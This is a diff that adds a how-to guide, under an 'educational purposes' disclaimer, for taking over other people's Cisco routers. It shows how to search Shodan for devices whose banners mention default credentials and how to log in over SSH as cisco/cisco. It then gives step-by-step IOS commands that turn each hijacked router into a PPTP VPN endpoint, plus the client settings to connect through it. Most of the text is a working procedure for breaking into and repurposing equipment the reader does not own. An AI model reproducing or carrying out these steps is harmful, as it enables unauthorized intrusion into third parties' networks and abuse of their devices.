@@ -1,0 +1,77 @@
+*** DISCLAIMER ***
+*** This information is for educational purposes, the author cannot be responsible for misuse of this information ***
+
+
+This document will detail how to setup your own VPN on a remote cisco router with default credentials
+
+Step 1.
+
+Find yourself a cisco router with VPN capability.
+To do this I used the shodan search engine (www.shodan.io) you will only get 1 page of results without logging in (5 pages if you create an account, you must pay for more than that).
+In the search bar type: admin password cisco "country:US" here we are looking for cisco routers whos telnet / ssh banner contains a warning that the default username and password is set for level 15 credentials (usually cisco;cisco or cisco;password or admin;password). The country US was used for several reasons but try any you want. 
+We are looking for a result like this:
+
+Cisco Configuration Professional (Cisco CP) is installed on this device. 
+This feature requires the one-time use of the username "cisco" with the 
+password "cisco". These default credentials have a privilege level of 15...
+
+Many of these banners have not been updated despite the credentials being changed, you will have to ssh to each of them to find out by using:
+
+ssh cisco@xxx.xxx.xxx.xxx and type the password "cisco" when prompted.
+
+If you are successful you will be greeted with a prompt first you will need to enable privileged commands, you do this by typing "enable"
+you will need to find the IP pool used by the router, first type "dir" and looking for the config file, this may look like:
+
+BSIwifiRTR#more cpconfig-8xxW.cfg
+!  The default startup configuration file for Cisco Configuration Professional (Cisco CP)
+!  DO NOT modify this file; it is required by Cisco CP as is for factory defaults
+!  Version 1.0
+!
+hostname yourname
+!
+logging buffered 51200 warnings
+!
+username cisco privilege 15 secret 0 cisco
+username cisco privilege 15 one-time secret 0 cisco
+!
+ip dhcp excluded-address 10.10.10.1
+!
+ip dhcp pool ccp-pool					***
+   import all
+   network 10.10.10.0 255.255.255.248
+   default-router 10.10.10.1
+   lease 0 2 
+
+then we need to enter the configuration mode by typing "config" and then "terminal" when prompted followed by:
+
+BSIwifiRTR(config)#vpdn enable 
+BSIwifiRTR(config)#vpdn-group 1
+BSIwifiRTR(config-vpdn)#accept-dialin
+BSIwifiRTR(config-vpdn-acc-in)#protocol pptp
+BSIwifiRTR(config-vpdn-acc-in)#virtual-template 1
+BSIwifiRTR(config-vpdn-acc-in)#exit
+BSIwifiRTR(config)#ip local pool test 10.10.10.1 10.10.10.250  *** (This is the pool we found in the config file) 
+BSIwifiRTR(config)#interface virtual-template 1
+BSIwifiRTR(config-if)#encapsulation ppp
+BSIwifiRTR(config-if)#peer default ip address pool test
+BSIwifiRTR(config-if)#ip unnumbered FastEthernet 0
+BSIwifiRTR(config-if)#no keepalive
+BSIwifiRTR(config-if)#ppp encrypt mppe auto
+BSIwifiRTR(config-if)#ppp authentication pap chap ms-chap
+
+For Linux users go to the network config panel and add a new VPN connection then:
+
+Add the IP of our router with default credentials in Gateway and the username and password below
+In the advanced tab:
+MSCHAP and MSCHAPv2 should be ticked, also MPPE point to point encryption as these were the settings we inputed to the router (if you use PAP or CHAP change ppp auth settings on the router), PPP echo packets may need to be enabled also.
+
+Now the VPN is on we need to check our routing table, open a prompt and type "route" you should have something like this: 
+
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         *               0.0.0.0         U     50     0        0 ppp0
+default         xxxxx           0.0.0.0         UG    600    0        0 wlan0
+10.10.10.2      *               255.255.255.255 UH    50     0        0 ppp0
+static-xxx-xxx  xxxxx           255.255.255.255 UGH   0      0        0 wlan0
+link-local      *               255.255.0.0     U     1000   0        0 wlan0
+192.168.0.0     *               255.255.255.0   U     600    0        0 wlan0
